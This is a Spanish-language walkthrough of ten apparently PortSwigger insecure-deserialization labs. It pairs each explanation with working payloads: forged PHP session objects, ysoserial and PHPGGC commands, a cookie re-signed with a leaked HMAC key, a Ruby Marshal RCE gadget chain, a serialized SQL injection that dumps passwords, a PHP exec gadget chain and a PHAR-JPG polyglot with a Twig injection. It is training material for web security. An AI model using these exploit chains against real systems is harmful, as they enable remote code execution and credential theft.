# Insecure deserialization

## Reto 1: Modificación de objetos serializados

Este laboratorio utiliza un mecanismo de sesión basado en serialización y, por lo tanto, es vulnerable a la escalada de privilegios. Para solucionarlo, edite el objeto serializado en la cookie de sesión para explotar esta vulnerabilidad y obtener privilegios administrativos. A continuación, elimine al usuario. carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

En este laboratorio se trabaja con una aplicación que utiliza objetos PHP serializados como mecanismo de sesión. Al iniciar sesión, se observa que la cookie contiene un objeto codificado en Base64 y URL.

Al decodificarlo, se descubre una estructura con un atributo admin configurado como falso (b:0). Al modificar este atributo a verdadero (b:1) y reenviar la petición, se otorgan privilegios administrativos al usuario.

Gracias a esto, se accede al panel de administración, desde donde es posible eliminar al usuario objetivo (carlos).

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

## Reto 2: Modificación de tipos de datos serializados


Este laboratorio utiliza un mecanismo de sesión basado en serialización y, por lo tanto, es vulnerable a la omisión de la autenticación. Para resolver el laboratorio, edite el objeto serializado en la cookie de sesión para acceder a... administratorcuenta. Luego, elimine el usuario. carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

En este laboratorio, la aplicación utiliza objetos PHP serializados dentro de una cookie de sesión. Al iniciar sesión como usuario legítimo, se puede interceptar y analizar la estructura del objeto.

La vulnerabilidad se explota modificando el tipo de dato del campo ‘access_token‘, convirtiéndolo de una cadena a un entero (i:0), y cambiando el nombre de usuario a ‘administrator‘, ajustando también la longitud del valor serializado.

Gracias a este cambio, la aplicación interpreta la sesión como si perteneciera al administrador. Esto permite acceder al panel de administración y eliminar al usuario carlos, resolviendo así el laboratorio.

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
```

## Reto 3: Uso de la funcionalidad de la aplicación para explotar la deserialización insegura

FACULTATIVO
LAB No resuelto

Este laboratorio utiliza un mecanismo de sesión basado en serialización. Una característica específica invoca un método peligroso en los datos proporcionados en un objeto serializado. Para resolver el laboratorio, edite el objeto serializado en la cookie de sesión y úselo para eliminarlo. morale.txtarchivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter

También tienes acceso a una cuenta de respaldo: gregg:rosebud  


En este laboratorio, la aplicación gestiona sesiones a través de objetos PHP serializados que incluyen atributos como la ruta al avatar del usuario.

Mediante la función legítima de eliminar cuenta, se puede explotar un comportamiento peligroso del servidor: al eliminar al usuario, el sistema también elimina el archivo indicado por el atributo ‘avatar_link‘.

Al modificar dicho atributo para que apunte al archivo ‘/home/carlos/morale.txt‘, la aplicación termina borrando ese fichero en lugar del avatar.

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ooru6xjhzzktovkjwksckzd9l9dhwhkv";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

## Reto 4: Inyección de objetos arbitrarios en PHP

Este laboratorio utiliza un mecanismo de sesión basado en serialización y, por lo tanto, es vulnerable a la inyección de objetos arbitrarios. Para solucionar el problema, cree e inyecte un objeto serializado malicioso para eliminar el... morale.txtArchivo del directorio personal de Carlos. Necesitará acceder al código fuente para resolver este laboratorio.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

En este laboratorio, se analiza una vulnerabilidad crítica: la inyección de objetos arbitrarios en PHP. Tras acceder al código fuente, se descubre una clase con un método mágico ‘__destruct()‘ que borra el archivo definido en el atributo ‘lock_file_path‘.

Aprovechando esta funcionalidad, se construye manualmente un objeto serializado que apunta al archivo ‘/home/carlos/morale.txt‘. Al inyectarlo como cookie de sesión y ejecutar una petición, el objeto se deserializa y el método destructivo se dispara automáticamente.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

## Reto 5: Explotación de la deserialización de Java con Apache Commons

Este laboratorio utiliza un mecanismo de sesión basado en serialización y carga la biblioteca Apache Commons Collections. Aunque no tenga acceso al código fuente, puede aprovechar este laboratorio utilizando cadenas de gadgets preconstruidas.

Para resolver el laboratorio, utilice una herramienta de terceros para generar un objeto serializado malicioso que contenga una carga útil de ejecución remota de código. Luego, pase este objeto al sitio web para eliminarlo. morale.txtarchivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

Este laboratorio expone una deserialización insegura en una aplicación Java que utiliza la librería Apache Commons Collections. Aunque no se tiene acceso al código fuente, es posible explotar la vulnerabilidad usando cadenas de gadgets preconstruidas.

Con la herramienta `ysoserial`, se genera un objeto serializado con un payload que ejecuta un comando del sistema operativo para eliminar el archivo morale.txt de Carlos. Este objeto se inyecta en la cookie de sesión tras codificarlo adecuadamente.

Cuando el servidor deserializa el objeto, se desencadena la ejecución remota del comando. Este escenario representa una amenaza crítica frecuente en aplicaciones Java que confían en objetos serializados sin validación adecuada.

```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

## Reto 6: Explotación de la deserialización de PHP con una cadena de gadgets preconstruida

Este laboratorio cuenta con un mecanismo de sesión basado en serialización que utiliza una cookie firmada. También utiliza un framework PHP común. Aunque no tenga acceso al código fuente, puede aprovechar la deserialización insegura de este laboratorio mediante cadenas de gadgets preconstruidas.

Para resolver el laboratorio, identifique el framework de destino y utilice una herramienta de terceros para generar un objeto serializado malicioso que contenga una carga útil de ejecución remota de código. Después, determine cómo generar una cookie firmada válida que contenga el objeto malicioso. Finalmente, transfiérala al sitio web para eliminar el objeto. morale.txtarchivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

analizamos el mecanismo de sesión basado en cookies firmadas con HMAC SHA-1. Al inspeccionar el contenido de la cookie, se identifica que contiene un objeto PHP serializado. Sin embargo, cualquier modificación invalida la firma, impidiendo su explotación directa.

Se encuentra un archivo de depuración expuesto (/cgi-bin/phpinfo.php) que revela que la aplicación usa Symfony 4.3.6. Además, en la salida del phpinfo, se expone la variable SECRET_KEY, que es fundamental para firmar de nuevo la cookie maliciosa con una firma válida.

Con la clave secreta descubierta, se utiliza la herramienta PHPGGC para generar un objeto serializado con un payload que elimina el archivo ‘morale.txt‘ de Carlos.

Este objeto se firma con HMAC SHA-1 utilizando la clave obtenida previamente, lo que permite generar una cookie válida que el servidor aceptará.

Finalmente, esta cookie maliciosa se inyecta en la sesión y, al ser deserializada por el backend de Symfony, se ejecuta el payload, logrando así la ejecución remota de comandos y la resolución del laboratorio.

```shell
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

```php
<?php
  $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
  $secretKey = "76xfgpxerrpc7fk09z35o25lxmbt55sx";
  $cookie = '{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac("sha1", $object, $secretKey) . '"}';
  echo $cookie;
?>
```

## Reto 7: Explotación de la deserialización de Ruby mediante una cadena de gadgets documentada

Este laboratorio utiliza un mecanismo de sesión basado en serialización y el framework Ruby on Rails. Existen exploits documentados que permiten la ejecución remota de código mediante una cadena de gadgets en este framework.

Para resolver el laboratorio, busque un exploit documentado y adáptelo para crear un objeto serializado malicioso que contenga una carga útil de ejecución remota de código. Luego, pase este objeto al sitio web para eliminarlo. morale.txtarchivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

En esta primera parte del laboratorio, examinamos la cookie de sesión y detectamos que contiene un objeto serializado en formato Ruby (Marshal). Al no disponer de acceso al código fuente, recurrimos a la búsqueda de exploits conocidos.

Localizamos un gadget de deserialización universal para Ruby 2.x–3.x desarrollado por vakzz, que permite la ejecución remota de comandos (RCE) en aplicaciones Ruby on Rails vulnerables. Este gadget será la base para construir nuestro objeto malicioso.

Modificamos el script del gadget encontrado para que ejecute ‘rm /home/carlos/morale.txt‘, y adaptamos su salida para que genere el objeto en formato Base64.

Este objeto se inserta en la cookie de sesión y se codifica en URL antes de ser enviado al servidor.

El backend deserializa el objeto malicioso y ejecuta el comando, eliminando el archivo y resolviendo el laboratorio.

```ruby
#!/usr/bin/ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```
Este script nos devuelve la siguiente cadena en base64 con el payload para sustituir en la cookie de sesión 

```shell
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

## Reto 8: Desarrollo de una cadena de gadgets personalizada para la deserialización de Java

Este laboratorio utiliza un mecanismo de sesión basado en serialización. Si logra construir una cadena de gadgets adecuada, puede aprovechar la deserialización insegura de este laboratorio para obtener la contraseña del administrador.

Para resolver el laboratorio, acceda al código fuente y úselo para construir una cadena de gadgets y obtener la contraseña del administrador. Luego, inicie sesión como administratory eliminar carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter

Tenga en cuenta que para resolver este laboratorio se requiere familiaridad básica con otro tema que hemos cubierto en la Academia de Seguridad Web . 


Necesitamos tres ficheros en java para poder serializar y deserializar y obtener la contraseña de la base de datos, para ello podemos abusar y extraer datos de la base de datos con la siguiente sentencia en SQL:

```java
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("' union select NULL,NULL,NULL,cast(string_agg(username||':'||password,',') as numeric),NULL,NULL,NULL,NULL from users-- -");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

```java
// All logic removed from ProductTemplate as it's not needed for serialization

package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    public String getId() {
        return id;
    }
}
```

```java
package data.productcatalog;
class Product {}
```

Para compilar el programa tenemos que hacer los siguientes comandos:

```
javac Main.java
java Main
```
De salida obtendremos la sentencia SQL serializada para poder cambiarla por nuestra cookie de sesion

```
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAeScgdW5pb24gc2VsZWN0IE5VTEwsTlVMTCxOVUxMLGNhc3Qoc3RyaW5nX2FnZyh1c2VybmFtZXx8JzonfHxwYXNzd29yZCwnLCcpIGFzIG51bWVyaWMpLE5VTEwsTlVMTCxOVUxMLE5VTEwgZnJvbSB1c2Vycy0tIC0=
Deserialized object ID: ' union select NULL,NULL,NULL,cast(string_agg(username||':'||password,',') as numeric),NULL,NULL,NULL,NULL from users-- -
```

## Reto 9: Desarrollo de una cadena de gadgets personalizada para la deserialización de PHP

Este laboratorio utiliza un mecanismo de sesión basado en serialización. Al implementar una cadena de gadgets personalizada, se puede aprovechar su deserialización insegura para lograr la ejecución remota de código. Para resolver el laboratorio, elimine el morale.txtarchivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
Accedemos al archivo ‘CustomTemplate.php‘ usando su versión de respaldo ‘.php~‘ y analizamos el flujo de ejecución del método mágico ‘__wakeup()‘.

Vemos cómo este método instancia un objeto ‘Product‘ usando dos atributos: ‘default_desc_type‘ y ‘desc‘. A su vez, ‘desc‘ puede contener un objeto DefaultMap, que implementa ‘__get()‘ con una llamada a ‘call_user_func()‘ que nos permite ejecutar funciones arbitrarias.

Combinando estos comportamientos, identificamos una cadena de gadgets que nos permite ejecutar comandos del sistema, como ‘rm /home/carlos/morale.txt‘, simplemente al deserializar un objeto bien construido.

Creamos manualmente un objeto CustomTemplate que contiene la cadena de gadgets necesaria. En este objeto, el atributo ‘desc‘ contiene una instancia de DefaultMap cuyo callback es la función exec. Al deserializarlo, ‘exec()‘ se invocará con el valor de ‘default_desc_type‘, que contiene nuestro comando malicioso.

Codificamos el objeto en Base64 y lo URL-encodeamos, luego lo inyectamos en la cookie de sesión. Al procesarse, se ejecuta el comando, lo que elimina el archivo ‘morale.txt‘ del directorio de Carlos y resuelve el laboratorio.

```php
<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    public function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$obj = new CustomTemplate();
$obj -> desc = new DefaultMap("exec");
$obj -> default_desc_type="rm /home/carlos/morale.txt";
echo serialize($obj);


?>

```
## Reto 10:Uso de la deserialización de PHAR para implementar una cadena de gadgets personalizada

Este laboratorio no utiliza explícitamente la deserialización. Sin embargo, si se combina PHAR Deserialización con otras técnicas de piratería avanzadas, aún puede lograr ejecución remota de código a través de una cadena de gadgets personalizada.

Para resolver el laboratorio, elimine el morale.txtarchivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

Accedemos al contenido de ‘Blog.php~‘ y ‘CustomTemplate.php~‘, donde descubrimos una combinación peligrosa: CustomTemplate contiene un atributo ‘template_file_path‘ que apunta a un objeto Blog, y Blog tiene un atributo ‘desc‘ que se interpreta mediante el motor de plantillas Twig.

Además, el atributo lockFilePath se pasa a ‘file_exists()‘, lo cual es un vector común para disparar la deserialización PHAR. Esto nos permite preparar un objeto con un payload SSTI (Server-Side Template Injection) que se ejecutará al ser interpretado por Twig, combinando ambas técnicas para lograr RCE.

Construimos en PHP un objeto CustomTemplate que contiene un Blog como plantilla, y en su atributo ‘desc‘ insertamos un payload Twig que aprovecha la función ‘registerUndefinedFilterCallback()‘ para ejecutar ‘rm /home/carlos/morale.txt‘.

Empaquetamos este objeto dentro de un archivo PHAR, y lo convertimos en un JPG válido para poder subirlo como avatar. Esto lo logramos creando un polyglot (PHAR-JPG) que funcione como imagen pero sea interpretado por PHP como un archivo PHAR cuando se accede con ‘phar://‘.

Una vez subido el archivo avatar con el payload PHAR incrustado, realizamos una petición a ‘avatar.php‘ modificando el parámetro ‘avatar‘ para usar el protocolo ‘phar://‘.

Esto hace que ‘file_exists()‘ evalúe el archivo como un objeto serializado, desencadenando la ejecución de nuestro payload Twig embebido, lo cual provoca que se ejecute el comando ‘rm /home/carlos/morale.txt‘, resolviendo así el laboratorio.

```
https://github.com/kunte0/phar-jpg-polyglot
```
Añadimos el código en `nano phar_jpg_polyglot.php` subimos el archivo out.jpg y en el enlace para ver la foto hacemos que el navegador lo interprete con el wrapper phar `https://0a53000a04742bb8806ab20500bf000c.web-security-academy.net/cgi-bin/avatar.php?avatar=phar://wiener`

```php
<?php
	class Blog{}
	class CustomTemplate{}
	$blog = new Blog();
	$blog->user="pwnd";
	$blog->desc= '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
	
	$obj = new CustomTemplate();
	$obj -> template_file_path =$blog;
?>

```